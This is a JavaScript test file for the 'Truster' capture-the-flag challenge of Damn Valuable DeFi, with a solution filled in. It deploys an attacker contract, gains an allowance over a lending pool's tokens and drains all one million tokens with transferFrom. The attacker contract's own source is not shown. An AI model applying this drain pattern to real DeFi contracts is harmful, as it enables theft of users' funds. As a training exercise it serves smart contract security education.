const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        const TrusterAttacker = await ethers.getContractFactory('TrusterAttacker', attacker);
        let hacker = await TrusterAttacker.deploy();
        console.log("phase1");

        await hacker.attack(this.pool.address, this.token.address, TOKENS_IN_POOL);
        console.log("phase2");


        // console.log(ethers.utils.formatEther(await this.token.allowance(this.pool.address, attacker.address)));
        // console.log(ethers.utils.formatEther(TOKENS_IN_POOL));

        // console.log(deployer.address);
        // console.log(attacker.address);
        // console.log(this.token.signer.address);
        attackerToken = await this.token.connect(attacker);
        console.log(attackerToken.signer.address);
        await attackerToken.transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

